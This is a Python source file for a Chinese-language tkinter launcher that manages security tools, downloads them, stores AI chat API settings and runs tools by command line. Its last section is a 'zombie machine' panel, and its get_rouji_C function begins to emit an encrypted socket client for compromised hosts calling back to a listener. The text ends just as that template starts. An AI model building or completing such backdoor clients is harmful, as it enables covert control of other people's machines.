import shutil
import tempfile
import urllib.request
import urllib.parse
import json
import os
import subprocess
import urllib
from tkinter import Button, Frame, LEFT, Menu, messagebox, simpledialog, filedialog, Toplevel, Label
from urllib.parse import urlparse
from encryption import *

### 一、创建全局变量
# 1、保存按钮信息
buttons = []

# 2、菜单栏、导航栏的配置文件
config_json_path = "config/config.json"

# 3、ai对话模型的配置文件
config_ai_json_path = "config/ai_ask.json"

# 4、本地终端字体大小
font_size = 15

# 5、语言环境变量的配置文件
config_env_json_path = "config/env_cofnig.json"

# 6、初始化语言翻译方向
translation_direction = ("en", "zh")

# 7、服务端配置文件
config_server_json_path = "config/server_config.json"

# 8、启动窗口大小配置文件
windowSize_json_path = "config/windowSize.json"

# 9、AI对话模型的历史
global_history = []

# 10、临时文本的最新行号
last_line_count = 1

# 11、肉鸡面板是否获取信息
rouji_json_xinxi_get = True

### 二、拿到用户电脑的屏幕尺寸
def center_window(win, width, height):
    # 获取屏幕的尺寸
    screen_width = win.winfo_screenwidth()
    screen_height = win.winfo_screenheight()

    # 计算 x 和 y 的偏移量，使得窗口居中
    x = (screen_width - width) // 2
    y = (screen_height - height) // 2

    # 设置窗口的几何属性
    win.geometry(f'{width}x{height}+{x}+{y}')

### 三、有关按钮的操作
# 1、添加按钮的右键操作
def on_right_click(frame_canvas,button,tool):
    # 创建右键菜单
    def show_context_menu(event):
        context_menu.post(event.x_root, event.y_root)  # 显示菜单

    # 定义菜单项和对应的操作
    context_menu = Menu(button, tearoff=0)
    context_menu.add_command(label="加入首页", command=lambda: join_index(tool))
    context_menu.add_command(label="移除首页", command=lambda: remove_index(tool))
    context_menu.add_separator()
    context_menu.add_command(label="打开所在文件夹", command=lambda: open_tools_path(frame_canvas,tool))
    context_menu.add_separator()
    context_menu.add_command(label="修改工具名称", command=lambda: edit_tools_name(frame_canvas,tool))
    context_menu.add_command(label="修改工具路径", command=lambda: edit_tools_path(frame_canvas,tool))
    context_menu.add_command(label="修改运行方式", command=lambda: edit_tools_run(frame_canvas,tool))
    context_menu.add_command(label="修改启动命令", command=lambda: edit_tools_command(frame_canvas,tool))
    context_menu.add_separator()
    context_menu.add_command(label="工具前移", command=lambda: left_move_tools(frame_canvas,tool))
    context_menu.add_command(label="工具后移", command=lambda: right_move_tools(frame_canvas,tool))
    context_menu.add_separator()
    context_menu.add_command(label="删除工具", command=lambda: delete_tools(frame_canvas,tool))
    context_menu.add_separator()
    context_menu.add_command(label="刷新", command=lambda: reload_tools(frame_canvas,tool))
    context_menu.add_separator()
    context_menu.add_command(label="属性", command=lambda: show_tools_properties(tool))

    # 绑定右键事件
    button.bind("<Button-3>", show_context_menu)

# 2、实现右键加入index首页操作
def join_index(tool_one):
    index = tool_one["index"]
    tool_categorie = tool_one["工具分类"]
    if index == 0:
        tools = get_tools(tool_categorie)
        # print(tools)
        # print("--------------------------")
        for tool in tools:
            if tool["工具名称"] == tool_one["工具名称"]:
                tool["index"] = 1
                break
        # 重新写入文件
        # print(tools)
        update_tools(tool_categorie,tools)
        # 提示写入成功
        messagebox.showinfo("设置成功！", "该工具成功被设置在首页！")
    else:
        messagebox.showinfo("设置失败！", "该工具已经被设置在首页！")

# 3、实现右键移除首页
def remove_index(tool_one):
    index = tool_one["index"]
    tool_categorie = tool_one["工具分类"]
    if index == 1:
        tools = get_tools(tool_categorie)
        for tool in tools:
            if tool["工具名称"] == tool_one["工具名称"]:
                tool["index"] = 0
                break
        update_tools(tool_categorie,tools)
        # 提示写入成功
        messagebox.showinfo("设置成功！", "该工具成功被移出首页！")
    else:
        messagebox.showinfo("设置失败！", "该工具已经被移出首页！")

# 4、创建按钮、刷新按钮。从 TXT 加载工具信息并创建按钮的函数（刷新操作）
def load_tools_and_create_buttons(frame_canvas,tool_categorie,tool_use="首页"):   # 这里的canvas实质是按钮的frame
    global buttons

    # 清空画布按钮
    for button in buttons:
        button.destroy()
    buttons.clear()

    # 配置列权重，确保按钮居中对齐
    max_buttons_per_row = 5
    for i in range(max_buttons_per_row + 2):  # 多出两列作为空白列
        frame_canvas.grid_columnconfigure(i, weight=1)  # 设置每一列的权重

    index = 0  # 初始化按钮索引
    max_buttons_per_row = 6  # 每行最多显示6个按钮

    for tool in get_tool_uses(tool_categorie,tool_use):
        # 创建按钮之前判断是不是链接
        if tool["启动方式"] == "下载链接":
            button = Button(frame_canvas, text=tool["工具名称"], command=lambda tool=tool: create_command_function(tool), padx=20, pady=10, fg="blue")
        else:
            # 判断工具路径是否存在
            if is_tool_path_active(tool):
                button = Button(frame_canvas, text=tool["工具名称"], command=lambda tool=tool: create_command_function(tool), padx=20, pady=10)
            else:
                button = Button(frame_canvas, text=tool["工具名称"], command=lambda tool=tool: create_command_function(tool), padx=20, pady=10, state="disabled", bg="lightgray", fg="gray")         # 设置文字颜色为灰色
        # 给按钮添加右键功能
        on_right_click(frame_canvas,button,tool)
        # 使用 grid 布局管理器在主窗口中放置按钮
        row = index // max_buttons_per_row
        column = index % max_buttons_per_row
        button.grid(row=row + 1, column=column, padx=15, pady=10, sticky='w')  # 调整起始行以避免覆盖画布内容
        index += 1
        buttons.append(button)  # 更新全局按钮列表

# 5、创建按钮命令操作
def create_command_function(tool):
    current_directory = get_os_path()  # 当前脚本所在的文件夹路径
    run_type = ["直接打开","命令行打开","文件夹打开","链接打开","下载链接"]

    # 获取工具的信息
    tool_path = tool["工具路径"]
    tool_run_type = tool["启动方式"]
    tool_command = tool["工具命令"]

    def command_run(is_paths,tool_path,tool_command):
        if tool_run_type == run_type[2]:  # 文件夹启动
            # 判断工具路径是绝对、相对路径
            if is_paths == 2:   # 相对路径路径
                # 与绝对路径一样，只是需要进行绝对路径的拼接
                tool_path = current_directory + "\\" + get_menu_path_one(tool["工具分类"]) + "\\" + tool_path
            if os_name():   # windows打开文件夹
                # print("走文件夹启动")
                # 获取工具所在的文件夹路径
                # folder_path = os.path.dirname(tool_path)
                # 使用 explorer 打开该目录
                subprocess.Popen(f'explorer "{tool_path}"')
            else:
                subprocess.Popen(['xdg-open', tool_path])   # linux打开文件夹
        elif tool_run_type == run_type[1]:  # 命令行启动
            try:
                if " " not in tool_command: # 说明可以直接执行
                    # 判断工具路径是绝对、相对路径
                    if is_paths == 2:   # 相对路径路径
                        # print("走命令行直接执行")
                        # 与绝对路径一样，只是需要进行绝对路径的拼接
                        tool_path = current_directory + "\\" + get_menu_path_one(tool["工具分类"]) + "\\" + tool_command
                        # 尝试直接执行
                    subprocess.Popen(tool_path)
                else:
                    # print("走命令行执行")
                    # 判断工具路径是绝对、相对路径
                    if is_paths == 2:   # 相对路径路径
                        # 与绝对路径一样，只是需要进行绝对路径的拼接
                        tool_path = current_directory + "\\" + get_menu_path_one(tool["工具分类"]) + "\\" + tool_path
                        # 尝试直接执行
                    # 将工具命令中的*进行替换
                    tool_command = tool_command.replace("*", tool_path)
                    # 打开 cmd.exe 并执行命令
                    command_to_execute = f'cd "{os.path.dirname(tool_path)}" && {tool_command}'
                    subprocess.Popen(f'start cmd /k "{command_to_execute}"', shell=True)
            except Exception as e:
                messagebox.showinfo(f"命令行启动失败","请右键修改启动命令")
                # print(f"出现错误{e}")
        elif tool_run_type == run_type[0]:    # 直接启动
            # 判断工具路径是绝对、相对路径
            if is_paths == 2:   # 相对路径路径
                # 与绝对路径一样，只是需要进行绝对路径的拼接
                tool_path = current_directory + "\\" + get_menu_path_one(tool["工具分类"]) + "\\" + tool_path
            try:
                # print("走直接执行")
                subprocess.Popen(tool_path)
            except Exception as e:
                messagebox.showinfo("直接启动失败","请右键修改启动命令！")
        elif tool_run_type == run_type[3]:      # 链接打开
            try:
                subprocess.Popen(f"start msedge {tool_path} & exit", shell=True)
            except Exception as e:
                command_to_execute = f'start msedge {tool_path}'
                # print(command_to_execute)
                subprocess.Popen(f'start cmd /k "{command_to_execute}"', shell=True)

    is_paths = is_path(tool)
    # 1、先判断启动方式
    if is_paths == 3:   # 下载链接
        tool_download_local_path = current_directory + "\\" + get_menu_path_one(tool["工具分类"]) + "\\" + tool["工具名称"]
        # 创建对应的文件
        create_dir(tool_download_local_path)
        # 进行文件的下载
        download_tools(tool,tool_path,tool_download_local_path + "\\" + os.path.basename(urlparse(tool_path).path))
    else:   # 就是非下载链接
        command_run(is_paths,tool_path,tool_command)

# 6、进行链接工具下载
def download_tools(tool,url,local_filename):
    try:
        # 使用urllib.request.urlopen打开URL
        with urllib.request.urlopen(url) as response:
            # 读取响应的内容
            data = response.read()
            # 写入到本地文件
            with open(local_filename, 'wb') as out_file:
                out_file.write(data)
        # 下载成功
        if "http" in tool["工具路径"]:
            # 说明启动方式还是一个链接，然后更改 工具路径
            txt_jsons = get_json_txt_all(get_menu_path_one(tool["工具分类"]))
            for txt_json in txt_jsons:
                if tool["工具名称"] == txt_json["工具名称"]:
                    txt_json["工具路径"] = tool["工具名称"] + "\\" + os.path.basename(urlparse(tool["工具路径"]).path)
            # 进行 txt 配置文件的保存
            update_tools(tool["工具分类"],txt_jsons)

        messagebox.showinfo("下载成功！", f"工具已下载到 {local_filename}\n请右键修改对工具命令行以便使用！")
    except Exception as e:
        print(f"下载失败: {e}")

# 7、修改工具名称
def edit_tools_name(frame_canvas,tool):
    new_tool_name = simpledialog.askstring("修改工具名称", "请输入修改的工具名称: ")
    if new_tool_name is not None:
        # 进行 tools.txt 配置文件的保存
        txt_jsons = get_json_txt_all(get_menu_path_one(tool["工具分类"]))   # 获取txt所有的工具

        # 判断是否重复
        if any(new_tool_name == txt_json["工具名称"] for txt_json in txt_jsons):
            messagebox.showinfo("修改失败","该工具名称已存在！")
        else:   # 工具名称不存在，工具名称唯一
            # 进行工具名称的修改
            for txt_json in txt_jsons:
                if tool["工具名称"] == txt_json["工具名称"]:
                    txt_json["工具名称"] = new_tool_name
            # 进行 txt 配置文件的保存
            update_tools(tool["工具分类"],txt_jsons)
            # 进入刷新函数
            load_tools_and_create_buttons(frame_canvas,tool["工具分类"],tool["工具使用"])

# 7、修改工具路径
def edit_tools_path(frame_canvas,tool):
    new_tool_path = simpledialog.askstring("修改工具工具", "请输入修改的工具路径: ")
    if new_tool_path is not None:
        # 进行 tools.txt 配置文件的保存
        txt_jsons = get_json_txt_all(get_menu_path_one(tool["工具分类"]))   # 获取txt所有的工具
        for txt_json in txt_jsons:
            if tool["工具名称"] == txt_json["工具名称"]:
                txt_json["工具路径"] = new_tool_path
        # 进行 txt 配置文件的保存
        update_tools(tool["工具分类"],txt_jsons)
        # 进入刷新函数
        load_tools_and_create_buttons(frame_canvas,tool["工具分类"],tool["工具使用"])

# 7、修改工具启动命令，对按钮启动命令进行修改
def edit_tools_command(frame_canvas,tool):
    command = simpledialog.askstring("修改启动命令", "可命令行启动(*代替文件名)与直接启动: ")
    if command is not None:
        # 进行 tools.txt 配置文件的保存
        txt_jsons = get_json_txt_all(get_menu_path_one(tool["工具分类"]))
        for txt_json in txt_jsons:
            if tool["工具名称"] == txt_json["工具名称"]:
                txt_json["工具命令"] = command
                txt_json["启动方式"] = "命令行打开"
        # print(txt_jsons)
        # 进行 txt 配置文件的保存
        update_tools(tool["工具分类"],txt_jsons)
        # 进入刷新函数
        load_tools_and_create_buttons(frame_canvas,tool["工具分类"],tool["工具使用"])

# 8、删除工具
def delete_tools(frame_canvas,tool):
    txt_all = get_json_txt_all(get_menu_path_one(tool["工具分类"]))
    txt_all = list(filter(lambda item: item["工具名称"] != tool["工具名称"], txt_all))  # tools.txt文件删除工具信息

    # 删除文件夹之前判断是链接还是相对路径
    is_paths = is_path(tool)
    if is_paths == 3:   # 链接
        delete_dir(get_menu_path_one(tool["工具分类"]),tool["工具名称"])
    elif is_paths == 2: # 相对路径
        # 删除相对路径前需要先询问是否删除相对路的相关工具文件夹
        if messagebox.askyesno("警告！","是否删除相对路径下对应的工具文件？"):
            delete_dir(get_menu_path_one(tool["工具分类"]),tool["工具路径"].split('\\')[0])
            messagebox.showinfo("删除成功！", "该工具及其文件成功被删除！")

    # 进行 tools 文件的更新
    update_tools(tool["工具分类"],txt_all)

    # 进入刷新函数
    load_tools_and_create_buttons(frame_canvas,tool["工具分类"],tool["工具使用"])

# 9、刷新工具
def reload_tools(frame_canvas,tool):
    # 进入刷新函数
    load_tools_and_create_buttons(frame_canvas,tool["工具分类"],tool["工具使用"])

# 10、打开工具所在文件夹
def open_tools_path(frame_canvas,tool):
    is_paths = is_path(tool)
    tool_path = '\\'.join(tool["工具路径"].split('\\')[:-1])

    # 判断工具路径是绝对、相对路径
    if is_paths == 2:   # 相对路径路径
        # 与绝对路径一样，只是需要进行绝对路径的拼接
        tool_path = get_os_path() + "\\" + get_menu_path_one(tool["工具分类"]) + "\\" + tool_path
    elif is_paths == 3 or is_paths == 4:
        messagebox.showinfo("警告！","链接工具无法在本地打开！")
        return
    if os_name():   # windows打开文件夹
        # print("走文件夹启动")
        # 获取工具所在的文件夹路径
        # folder_path = os.path.dirname(tool_path)
        # 使用 explorer 打开该目录
        subprocess.Popen(f'explorer "{tool_path}"')
    else:
        subprocess.Popen(['xdg-open', tool_path])   # linux打开文件夹

# 11、工具前移、工具左移
def left_move_tools(frame_canvas,tool):
    # 获取当前工具所属的txt文件
    txt_jsons = get_json_txt_all(get_menu_path_one(tool["工具分类"]))
    # 循环遍历下标进行替换
    for i in range(len(txt_jsons)):
        if txt_jsons[i]["工具名称"] == tool["工具名称"]:
            if i == 0:
                messagebox.showinfo("警告！","该工具已经位于最前侧，不可移动")
            else:
                txt_jsons[i-1],txt_jsons[i] = txt_jsons[i],txt_jsons[i-1]
    # 进行 txt 配置文件的保存
    update_tools(tool["工具分类"],txt_jsons)
    # 进入刷新函数
    load_tools_and_create_buttons(frame_canvas,tool["工具分类"],tool["工具使用"])

# 12、工具后移、工具右移
def right_move_tools(frame_canvas,tool):
    # 获取当前工具所属的txt文件
    txt_jsons = get_json_txt_all(get_menu_path_one(tool["工具分类"]))
    # 循环遍历下标进行替换
    for i in range(len(txt_jsons)):
        if txt_jsons[i]["工具名称"] == tool["工具名称"]:
            if i == len(txt_jsons)-1:
                messagebox.showinfo("警告！","该工具已经位于最后侧，不可移动")
            else:
                txt_jsons[i+1],txt_jsons[i] = txt_jsons[i],txt_jsons[i+1]
            break
    # 进行 txt 配置文件的保存
    update_tools(tool["工具分类"],txt_jsons)
    # 进入刷新函数
    load_tools_and_create_buttons(frame_canvas,tool["工具分类"],tool["工具使用"])

# 13、修改工具启动方式
def edit_tools_run(frame_canvas,tool):
    import tkinter as tk
    from tkinter import ttk
    root = tk.Tk()
    root.title("修改启动方式")
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    position_top = int(screen_height / 2 - 75)  # 假设默认高度为150的一半
    position_right = int(screen_width / 2 - 150)  # 假设默认宽度为300的一半
    root.geometry(f"+{position_right}+{position_top}")
    run_type_label = ttk.Label(root, text="启动方式:")
    run_type_label.grid(row=0, column=0, padx=(0, 10), sticky='e')
    tool_run_type = ttk.Combobox(root, values=["直接打开","命令行打开","文件夹打开","链接打开","下载链接"], state="readonly")
    tool_run_type.current(0)  # 设置当前选中项为第一个
    tool_run_type.grid(row=0, column=1, padx=(0, 10), sticky='we')  # 将下拉框放置在网格中
    def save_button():
        print(tool_run_type.get())  # 获取下拉框的当前值
        # 获取工具的json信息
        tool_json = get_json_txt_all(get_menu_path_one(tool["工具分类"]))
        # 循环遍历下标进行替换
        for i in range(len(tool_json)):
            if tool_json[i]["工具名称"] == tool["工具名称"]:
                tool_json[i]["启动方式"] = tool_run_type.get()
                break
        # 销毁root
        root.destroy()
        # 进行 txt 配置文件的保存
        update_tools(tool["工具分类"],tool_json)
        # 进入刷新函数
        load_tools_and_create_buttons(frame_canvas,tool["工具分类"],tool["工具使用"])
    save_btn = ttk.Button(root, text="保存", command=save_button)
    save_btn.grid(row=1, column=0, columnspan=2, pady=10)
    root.mainloop()

# 14、判断工具路径是否存在
def is_tool_path_active(tool):
    # 1、判断工具类型
    if is_path(tool) == 2:   # 相对路径
        # 进行路径拼接
        tool_path = get_os_path() + "\\" + get_menu_path_one(tool["工具分类"]) + "\\" + tool["工具路径"]
    elif is_path(tool) == 1:   # 绝对路径
        tool_path = tool["工具路径"]
    else:
        return True

    if os.path.exists(tool_path):
        return True
    else:
        return False

# 15、查看工具属性
def show_tools_properties(tool):
    # 获取当前工具所属的txt文件
    txt_jsons = get_json_txt_all(get_menu_path_one(tool["工具分类"]))
    # 循环遍历下标进行替换
    tool_properties = {}
    for i in range(len(txt_jsons)):
        if txt_jsons[i]["工具名称"] == tool["工具名称"]:
            tool_properties = txt_jsons[i]
    tool_propertie_content = ""
    for key in tool_properties.keys():
        tool_propertie_content += f"{key}：{tool_properties[key]}\n"
    messagebox.showinfo("工具属性",tool_propertie_content)

### 四、有关导航栏的操作
# 1、创建导航栏
def create_Navigation_Bar(win,canvas,navigation_bar_names,menu_name):    # 这里的canvas实质是按钮的frame，为了按钮能够显示出来
    navigation_bar = Frame(win, bg="lightgrey")  # 导航栏背景颜色
    navigation_bar.place(x=0, y=0, relwidth=1)  # 放置在菜单栏下方

    # 在导航栏中添加按钮
    for navigation_bar_name in navigation_bar_names:
        # 动态创建按钮并添加到导航栏
        button = Button(navigation_bar, text=navigation_bar_name, command=lambda tool_use=navigation_bar_name: load_tools_and_create_buttons(canvas, menu_name, tool_use=tool_use))
        button.pack(side=LEFT, padx=0.05, pady=2)  # 使用 pack 布局管理器
        show_context_menu(button,menu_name,navigation_bar_name)

# 2、导航栏左侧移动
def navigation_Bar_Left_Move(menu_name,navigation_bar_name):
    # 说白了就是重新整改json_config 文件内容
    # config_json变量存放了目前json_config 文件的整个json内容
    # 我们应该根据导航栏button 的名字来定位这个导航栏：navigation_bar_name
    # 导航栏的内容存储在 config/config.json中
    # 1、先获取当前菜单栏的整个导航栏内容
    all_navigation_Bar_names = config_json[menu_name]["navigation_bar_name"]

    # 2、循环遍历下标进行替换
    for i in range(len(all_navigation_Bar_names)):
        if all_navigation_Bar_names[i] == navigation_bar_name:
            if i == 0:
                messagebox.showinfo("警告！","该导航栏按钮已经位于最左侧，不可移动")
            else:
                all_navigation_Bar_names[i-1],all_navigation_Bar_names[i] = all_navigation_Bar_names[i],all_navigation_Bar_names[i-1]

    # 3、对全局变量config_json 进行更新
    config_json[menu_name]["navigation_bar_name"] = all_navigation_Bar_names

    # 4、保存更改设置
    save_json_all(config_json)

    # 5、移动成功，刷新一波

# 3、导航栏右侧移动
def navigation_Bar_Right_Move(menu_name,navigation_bar_name):
    all_navigation_Bar_names = config_json[menu_name]["navigation_bar_name"]

    # 2、循环遍历下标进行替换
    for i in range(len(all_navigation_Bar_names)-1 ,-1 ,-1):
        if all_navigation_Bar_names[i] == navigation_bar_name:
            if i == len(all_navigation_Bar_names)-1:
                messagebox.showinfo("警告！","该导航栏按钮已经位于最右侧，不可移动")
            else:
                all_navigation_Bar_names[i],all_navigation_Bar_names[i+1] = all_navigation_Bar_names[i+1],all_navigation_Bar_names[i]

    # 3、对全局变量config_json 进行更新
    config_json[menu_name]["navigation_bar_name"] = all_navigation_Bar_names

    # 4、保存更改设置
    save_json_all(config_json)

    # 5、移动成功，刷新一波

# 4、删除导航栏
def navigation_Bar_delete(menu_name,navigation_bar_name):
    all_navigation_Bar_names = config_json[menu_name]["navigation_bar_name"]

    # 2、循环遍历下标进行替换
    for i in range(len(all_navigation_Bar_names)-1, -1, -1):
        if all_navigation_Bar_names[i] == navigation_bar_name:
            del all_navigation_Bar_names[i]

    # 3、对全局变量config_json 进行更新
    config_json[menu_name]["navigation_bar_name"] = all_navigation_Bar_names

    # 4、保存更改设置
    save_json_all(config_json)

    # 5、进行刷新

# 5、更改导航栏名称
def navigation_Bar_Update_name(menu_name,navigation_bar_name):
    all_navigation_Bar_names = config_json[menu_name]["navigation_bar_name"]

    # 2、循环遍历下标进行替换
    for i in range(len(all_navigation_Bar_names)):
        if all_navigation_Bar_names[i] == navigation_bar_name:
            new_navigation_Bar_name = simpledialog.askstring("修改导航栏名称", "请勿使用空格和特殊字符")
            if new_navigation_Bar_name is not None:
                all_navigation_Bar_names[i] = new_navigation_Bar_name

                # 5、对json_txt 配置进行更新
                # 我们应该获取全txt 之后对json txt 进行全更新
                txt_all = get_json_txt_all(get_menu_path_one(menu_name))
                for json_txt_tool in txt_all:
                    if json_txt_tool["工具使用"] == navigation_bar_name:
                        json_txt_tool["工具使用"] = new_navigation_Bar_name
                # 进行 tools 文件的全更新
                update_tools(menu_name,txt_all)

                # 3、对全局变量config_json 进行更新
                config_json[menu_name]["navigation_bar_name"] = all_navigation_Bar_names

                # 4、保存更改设置
                save_json_all(config_json)

                # 进入导航栏的刷新


# 6、导航栏右键菜单设置
def show_context_menu(button,menu_name,navigation_bar_name):
    # 创建右键菜单
    # navigation_bar_name 是导航栏的名字，帮助我们很好的定位这个导航栏
    def show_context_menu(event):
        context_menu.post(event.x_root, event.y_root)  # 显示菜单

    # 定义菜单项和对应的操作
    context_menu = Menu(button, tearoff=0)
    context_menu.add_command(label="左移一格", command=lambda: navigation_Bar_Left_Move(menu_name,navigation_bar_name))
    context_menu.add_command(label="右移一格", command=lambda: navigation_Bar_Right_Move(menu_name,navigation_bar_name))
    context_menu.add_command(label="删除导航栏", command=lambda: navigation_Bar_delete(menu_name,navigation_bar_name))
    context_menu.add_separator()
    context_menu.add_command(label="更改名称", command=lambda: navigation_Bar_Update_name(menu_name,navigation_bar_name))

    # 绑定右键事件
    button.bind("<Button-3>", show_context_menu)

### 五、有关 config_json 文件的操作
# 获取 json 文件中的所有内容
def get_json_all():
    global config_json

    try:
        with open(config_json_path, 'r') as json_file:
            return json.load(json_file)     # 返回json文件所有内容，即一个json对象
    except FileNotFoundError:
        print(f"[!] 警告！{config_json_path} 配置信息文件出错")
    return {}

config_json = get_json_all()

# 判断 config.json 文件是否为空。 非空，返回True
def config_json_null_check():
    return len(config_json) != 0

# 获取 json 文件中所有的 menu 名字，返回的是数组
def get_menu_name_all():
    if config_json_null_check():
        return list(config_json.keys())
    else:
        return []

# 获取所有 menu 对应的 path 路径，返回的是 字符串。间接的判断这个菜单栏是否存在
def get_menu_path_one(menu_name):
    for menu_names in get_menu_name_all():
        if menu_names == menu_name:
            return config_json[menu_name]["menu_path"]
    return []

# 根据 menu 的名称获取对应的color颜色，返回具体的颜色值
def get_menu_color_one(menu_name):
    return config_json[menu_name]["menu_color"]

# 根据 menu 的名称获取对应的导航栏名称，返回的是一个 数组格式
def get_navigation_bar_one(menu_name):
    navigation_bar_name = config_json.get(menu_name, {}).get("navigation_bar_name")
    if navigation_bar_name == None:
        return []
    else:
        return navigation_bar_name

# 对 完整的json 进行写入，需要给一个完整的 json 格式
def save_json_all(json_info):
    with open(config_json_path, 'w') as json_file:
        json.dump(json_info, json_file, indent=4)  # indent=4 用于格式化输出

### 六、有关 工具tools 的 txt 文件的操作
# 1、进行txt 文件读取。需要是 菜单栏的路径 ，返回的是 数组
def get_json_txt_all(menu_path):
    tools = []
    try:
        with open(menu_path + '/tools.txt', 'r', encoding='utf-8') as file:
            for line in file:
                try:
                    tool = json.loads(line.strip()) # 一行一行进行解析
                    tools.append(tool)
                except json.JSONDecodeError as e:
                    print(f"解析JSON失败：{e}")
                    return []
    except FileNotFoundError as e:
        print(f"[!] 警告！{menu_path}/tools.txt 工具配置信息文件出错")
    return tools

# 2、进行 txt文件 写入。需要的是 菜单栏的路径 和 一行的json数据
def save_tool_txt(txt_path,tool_info):
    with open(txt_path + "/tools.txt", "a", encoding='utf-8') as file:
        json.dump(tool_info, file, ensure_ascii=False)
        file.write('\n')  # 换行分隔每个工具的信息

# 3、根据工具的uses使用 获取同类型工具
def get_tool_uses(tool_categorie,tool_use):
    tool_uses = []
    tools = get_tools(tool_categorie)   # 本质是获取所有tools.txt 文件内容
    if tool_use == "首页":
        for tool in tools:
            if tool_use == tool["工具使用"]:
                tool_uses.append(tool)
            elif tool["index"] == 1:
                tool_uses.append(tool)
    else:
        for tool in tools:
            if tool_use == tool["工具使用"]:
                tool_uses.append(tool)
    return tool_uses

# 4、根据工具类型获取对应目录下tools.txt 文件的所有内容
def get_tools(tool_categorie):  # 根据 工具的分类（菜单栏名称） 获取tools.txt 下所有的工具
    tools = []
    txt_path = get_menu_path_one(tool_categorie)
    try:
        with open(txt_path + '/tools.txt', 'r', encoding='utf-8') as file:
            for line in file:
                try:
                    tool = json.loads(line.strip()) # 一行一行进行解析
                    tools.append(tool)
                except json.JSONDecodeError as e:
                    print(f"解析 JSON 时发生错误：{e}")
    except FileNotFoundError:
        print(f"[!] 警告！{txt_path}/tools.txt 工具配置信息文件出错")
    return tools

# 5、更新update_json_text_all: 全写入全更新操作：菜单栏和全写入的json_txt 内容
def update_tools(tool_categorie,tool_info):
    # 1、获取这个tools文件的路径
    txt_path = get_menu_path_one(tool_categorie)

    # 2、清空这个tools文件
    with open(txt_path + "/tools.txt", 'w') as file:
        pass  # 不需要执行任何操作，直接关闭文件

    # 3、进行tools文件的追加
    for tool in tool_info:
        save_tool_txt(txt_path,tool)

### 七、AI对话模型设置
# 1、获取 ai_json 文件中的所有内容
def get_ai_json_all():
    global config_ai_json

    try:
        with open(config_ai_json_path, 'r') as json_file:
            return json.load(json_file)     # 返回json文件所有内容，即一个json对象
    except FileNotFoundError:
        print("警告！" + "请先在工具箱配置中配置好AI的API！")
    return {}

config_ai_json = get_ai_json_all()

# 2、校验ai的json文件是否存在
def config_ai_json_null_check():
    global config_ai_json
    config_ai_json = get_ai_json_all()
    try:
        for ai_name in config_ai_json.keys():
            if config_ai_json[ai_name]["AI_API"] != "":
                return True
        return False
    except Exception as e:
        return False

# 3、获取 json 文件中所有的 AI 名字，返回的是数组
def get_ai_json_name_all():
    ai_keys_lists = list(config_ai_json.keys())
    return ai_keys_lists

# 4、修改更新ai的json配置文件
def update_ai_json(ai_names, ai_api, page_nums, ai_names_two):
    if page_nums == 2:
        config_ai_json[ai_names_two]["use_page"] = page_nums

    config_ai_json[ai_names]["AI_API"] = ai_api.strip()
    config_ai_json[ai_names]["use_page"] = page_nums

    # 给非这两个ai的user_page设置成0
    for ai_name in get_ai_json_name_all():
        if ai_name != ai_names and ai_name != ai_names_two:
            config_ai_json[ai_name]["use_page"] = 0
    # 更新json文件

    update_ai_all_json(config_ai_json)

# 5、全更改ai的json配置文件
def update_ai_all_json(json_info):
    # 进行tools文件的覆盖
    with open(config_ai_json_path, 'w') as json_file:
        json.dump(json_info, json_file, indent=4)  # indent=4 用于格式化输出

# 6、创建ai的json文件
def create_ai_json():
    # use_page 表示了两个设置
    # 1、use表示是否启用这个AI
    # 2、page表示设置多少分栏，目前仅支持2个分栏
    # 3、use_page 的值分别有：False、1、2
    ai_info = {
        "kimi_ai":{
            "AI_API"    :   "",
            "ai_color"  :   "",
            "use_page"      :   0
        },
        "通义千问":{
            "AI_API"    :   "",
            "ai_color"  :   "",
            "use_page"      :   0
        },
        "智谱清言":{
            "AI_API"    :   "",
            "ai_color"  :   "",
            "use_page"      :   0
        },
        "deepseek_api":{
            "AI_API"    :   "",
            "ai_color"  :   "",
            "use_page"      :   0
        },
        "ollama":{
            "AI_API"    :   "",
            "ai_color"  :   "",
            "use_page"      :   0
        }
    }
    update_ai_all_json(ai_info)

# 7、获取某一个ai的api
def get_ai_json_one_api(ai_name):
    for ai_names in get_ai_json_name_all():
        if ai_names == ai_name:
            return config_ai_json[ai_name]["AI_API"]

# 8、获取某一个ai的color
def get_ai_json_one_color(ai_name):
    return config_ai_json[ai_name]["ai_color"]

# 9、获取当前use为True 的AI名称
def get_ai_json_use_True_name():
    try:
        for ai_names in get_ai_json_name_all():
            # 判断谁的use 是True
            if config_ai_json[ai_names]['use_page'] != 0:
                return ai_names
    except Exception:
        print("由于对话模型配置变动，请删除config/ai_ask.json 重新配置API！")

# 10、获取当前use为True 的两个AI的名称
def get_ai_json_use_True_name_two():
    try:
        ai_use_True_twon_names = []
        for ai_names in get_ai_json_name_all():
            # 判断谁的use 是True
            if config_ai_json[ai_names]['use_page'] == 2:
                ai_use_True_twon_names.append(ai_names)
        return ai_use_True_twon_names
    except Exception:
        print("由于对话模型配置变动，请删除config/ai_ask.json 重新配置API！")

# 11、获取当前分栏的数量
def get_ai_json_use_page():
    try:
        return config_ai_json[get_ai_json_use_True_name()]['use_page']
    except Exception:
        return 0

### 八、启动窗口大小配置
# 1、保存启动窗口大小配置
def update_windowSize_json(windowSize_Widths,windowSize_Higths):
    with open(windowSize_json_path, "w", encoding='utf-8') as f:
        json.dump({"windowSize_Width": windowSize_Widths, "windowSize_Higths": windowSize_Higths}, f, indent=4)

# 2、读取启动窗口大小配置
def get_windowSize_json():
    try:
        with open(windowSize_json_path, 'r') as json_file:
            return json.load(json_file)     # 返回json文件所有内容，即一个json对象
    except Exception:
        return {}


### 九、肉鸡面板的配置
# 1、增加服务端配置信息（覆盖式增加）
def save_server_json(json_info):
    with open(config_server_json_path, 'w') as json_file:
        json.dump(json_info, json_file, indent=4)  # indent=4 用于格式化输出

# 2、获取服务端配置信息
def get_server_json():
    try:
        with open(config_server_json_path, 'r') as json_file:
            return json.load(json_file)     # 返回json文件所有内容，即一个json对象
    except Exception:
        return {}

# 3、判断配置文件是否为空，若为空放回 False
def config_server_json_null_check():
    if len(get_server_json()) == 0 or get_server_json() == {}:
        return False
    else:
        return True

# 4、清空rouji.json 配置文件，方便下次使用
def delete_server_json():
    if os.path.isfile(config_server_json_path):
        os.remove(config_server_json_path)

# 5、增加对C端肉鸡的脚本输出
def get_rouji_C(listen_IP, listen_Port, language):

    if language == "python":
        return f"""import socket
import subprocess
import select
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os
import sys
import base64
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
